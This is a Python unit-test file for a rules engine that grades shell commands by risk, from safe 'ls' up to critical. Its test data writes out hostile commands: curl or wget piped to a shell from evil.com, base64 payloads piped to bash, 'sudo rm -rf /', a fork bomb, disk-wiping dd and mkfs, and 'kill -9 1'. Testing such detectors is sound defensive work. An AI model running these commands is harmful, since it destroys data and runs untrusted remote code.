"""
test_rules_engine.py

20 unit tests for rules_engine.check() covering safe, medium, high, and
critical commands across all seven deterministic rules plus the KB fallback.
"""

import unittest
from rules_engine import check
from knowledge_base import lookup


# ---------------------------------------------------------------------------
# Helper to build AST dicts concisely
# ---------------------------------------------------------------------------

def _ast(
    command: str = "",
    flags: list[str] | None = None,
    args: list[str] | None = None,
    target_path: str = "",
    is_sudo: bool = False,
    is_recursive: bool = False,
    is_force: bool = False,
    raw: str = "",
    pipe_to: str = "",
) -> dict:
    return {
        "command": command,
        "flags": flags or [],
        "args": args or [],
        "target_path": target_path,
        "is_sudo": is_sudo,
        "is_recursive": is_recursive,
        "is_force": is_force,
        "raw": raw,
        "pipe_to": pipe_to,
    }


class TestRulesEngine(unittest.TestCase):
    """20 tests ordered roughly by expected risk level."""

    # ------------------------------------------------------------------ #
    #  SAFE / LOW                                                          #
    # ------------------------------------------------------------------ #

    def test_01_ls_is_safe(self):
        """Plain 'ls -la' has no KB entry and no rule match → low."""
        ast = _ast(command="ls", flags=["-l", "-a"], raw="ls -la")
        result = check(ast, kb_entry=None)
        self.assertEqual(result["risk"], "low")
        self.assertEqual(result["matched_rule"], "default_allow")

    def test_02_git_status_is_safe(self):
        """'git status' is in KB as low risk, no dangerous flags."""
        ast = _ast(command="git", args=["status"], raw="git status")
        result = check(ast, lookup("git"))
        self.assertEqual(result["risk"], "low")

    def test_03_cat_is_safe(self):
        """'cat /etc/hostname' — no KB entry, harmless read."""
        ast = _ast(command="cat", args=["/etc/hostname"], raw="cat /etc/hostname")
        result = check(ast, kb_entry=None)
        self.assertEqual(result["risk"], "low")

    def test_04_chmod_644_single_file(self):
        """'chmod 644 file.txt' — safe, no recursion, no 777."""
        ast = _ast(command="chmod", flags=["644"], args=["file.txt"],
                   target_path="file.txt", raw="chmod 644 file.txt")
        result = check(ast, lookup("chmod"))
        self.assertIn(result["risk"], ("low", "medium"))

    def test_05_find_without_delete(self):
        """'find /tmp -name *.log' — no -delete, no -exec → low/medium."""
        ast = _ast(command="find", flags=["-name"], args=["*.log"],
                   target_path="/tmp", raw="find /tmp -name '*.log'")
        result = check(ast, lookup("find"))
        self.assertIn(result["risk"], ("low", "medium"))

    # ------------------------------------------------------------------ #
    #  MEDIUM                                                              #
    # ------------------------------------------------------------------ #

    def test_06_rm_single_file(self):
        """'rm file.txt' — KB says critical but no risky flags → medium at most."""
        ast = _ast(command="rm", args=["file.txt"], target_path="file.txt",
                   raw="rm file.txt")
        result = check(ast, lookup("rm"))
        self.assertIn(result["risk"], ("low", "medium", "high"))
        self.assertNotEqual(result["risk"], "critical")

    def test_07_kill_9_regular_process(self):
        """'kill -9 12345' — SIGKILL on a regular PID is not PID 1."""
        ast = _ast(command="kill", flags=["-9"], args=["12345"],
                   raw="kill -9 12345")
        result = check(ast, lookup("kill"))
        self.assertNotEqual(result["risk"], "critical")

    def test_08_wget_simple_download(self):
        """'wget https://example.com/file.tar.gz' — no pipe, no insecure."""
        ast = _ast(command="wget", args=["https://example.com/file.tar.gz"],
                   raw="wget https://example.com/file.tar.gz")
        result = check(ast, lookup("wget"))
        self.assertIn(result["risk"], ("low", "medium"))

    def test_09_rm_r_tmpdir(self):
        """'rm -r /tmp/mydir' — recursive but no force, not root path."""
        ast = _ast(command="rm", flags=["-r"], args=["/tmp/mydir"],
                   target_path="/tmp/mydir", is_recursive=True,
                   raw="rm -r /tmp/mydir")
        result = check(ast, lookup("rm"))
        # Should be elevated but not critical (no force, no sudo, /tmp subdir)
        self.assertIn(result["risk"], ("medium", "high"))

    # ------------------------------------------------------------------ #
    #  HIGH                                                                #
    # ------------------------------------------------------------------ #

    def test_10_curl_pipe_bash(self):
        """'curl -sL https://evil.com/setup.sh | bash' → high (rule 3)."""
        ast = _ast(command="curl", flags=["-sL"],
                   args=["https://evil.com/setup.sh"],
                   raw="curl -sL https://evil.com/setup.sh | bash",
                   pipe_to="bash")
        result = check(ast, lookup("curl"))
        self.assertEqual(result["risk"], "high")
        self.assertEqual(result["matched_rule"], "pipe_curl_wget_to_shell")

    def test_11_wget_pipe_sh(self):
        """'wget -qO- https://evil.com/x | sh' → high (rule 3)."""
        ast = _ast(command="wget", flags=["-qO-"],
                   args=["https://evil.com/x"],
                   raw="wget -qO- https://evil.com/x | sh",
                   pipe_to="sh")
        result = check(ast, lookup("wget"))
        self.assertEqual(result["risk"], "high")
        self.assertEqual(result["matched_rule"], "pipe_curl_wget_to_shell")

    def test_12_base64_decode_eval(self):
        """'echo payload | base64 -d | bash' → high (rule 7)."""
        ast = _ast(command="echo",
                   args=["cGF5bG9hZA=="],
                   raw="echo cGF5bG9hZA== | base64 -d | bash")
        result = check(ast, kb_entry=None)
        self.assertEqual(result["risk"], "high")
        self.assertEqual(result["matched_rule"], "base64_decode_exec")

    def test_13_base64_decode_eval_variant(self):
        """'base64 --decode payload.b64 | eval' → high (rule 7)."""
        ast = _ast(command="base64",
                   flags=["--decode"],
                   args=["payload.b64"],
                   raw="base64 --decode payload.b64 | eval")
        result = check(ast, kb_entry=None)
        self.assertEqual(result["risk"], "high")
        self.assertEqual(result["matched_rule"], "base64_decode_exec")

    # ------------------------------------------------------------------ #
    #  CRITICAL                                                            #
    # ------------------------------------------------------------------ #

    def test_14_sudo_rm_rf_root(self):
        """'sudo rm -rf /' → critical (rule 1)."""
        ast = _ast(command="rm", flags=["-r", "-f"], args=["/"],
                   target_path="/", is_sudo=True, is_recursive=True,
                   is_force=True, raw="sudo rm -rf /")
        result = check(ast, lookup("rm"))
        self.assertEqual(result["risk"], "critical")
        self.assertEqual(result["matched_rule"], "sudo_recursive_force_critical_path")

    def test_15_sudo_rm_rf_home(self):
        """'sudo rm -rf /home' → critical (rule 1)."""
        ast = _ast(command="rm", flags=["-r", "-f"], args=["/home"],
                   target_path="/home", is_sudo=True, is_recursive=True,
                   is_force=True, raw="sudo rm -rf /home")
        result = check(ast, lookup("rm"))
        self.assertEqual(result["risk"], "critical")
        self.assertEqual(result["matched_rule"], "sudo_recursive_force_critical_path")

    def test_16_fork_bomb(self):
        """':(){ :|:& };:' → critical (rule 2)."""
        ast = _ast(raw=":(){ :|:& };:")
        result = check(ast, kb_entry=None)
        self.assertEqual(result["risk"], "critical")
        self.assertEqual(result["matched_rule"], "fork_bomb")

    def test_17_chmod_777_R_etc(self):
        """'chmod 777 -R /etc' → critical (rule 4)."""
        ast = _ast(command="chmod", flags=["-R", "777"], args=["/etc"],
                   target_path="/etc", is_recursive=True,
                   raw="chmod 777 -R /etc")
        result = check(ast, lookup("chmod"))
        self.assertEqual(result["risk"], "critical")
        self.assertEqual(result["matched_rule"], "chmod_777_recursive_system")

    def test_18_dd_to_dev_sda(self):
        """'dd if=/dev/zero of=/dev/sda bs=1M' → critical (rule 5)."""
        ast = _ast(command="dd",
                   args=["if=/dev/zero", "of=/dev/sda", "bs=1M"],
                   raw="dd if=/dev/zero of=/dev/sda bs=1M")
        result = check(ast, lookup("dd"))
        self.assertEqual(result["risk"], "critical")
        self.assertEqual(result["matched_rule"], "dd_mkfs_device")

    def test_19_mkfs_nvme(self):
        """'mkfs.ext4 /dev/nvme0n1' → critical (rule 5)."""
        ast = _ast(command="mkfs.ext4",
                   args=["/dev/nvme0n1"],
                   target_path="/dev/nvme0n1",
                   raw="mkfs.ext4 /dev/nvme0n1")
        result = check(ast, lookup("mkfs"))
        self.assertEqual(result["risk"], "critical")
        self.assertEqual(result["matched_rule"], "dd_mkfs_device")

    def test_20_kill_9_pid1(self):
        """'kill -9 1' → critical (rule 6)."""
        ast = _ast(command="kill", flags=["-9"], args=["1"],
                   raw="kill -9 1")
        result = check(ast, lookup("kill"))
        self.assertEqual(result["risk"], "critical")
        self.assertEqual(result["matched_rule"], "kill_pid1")


if __name__ == "__main__":
    unittest.main()
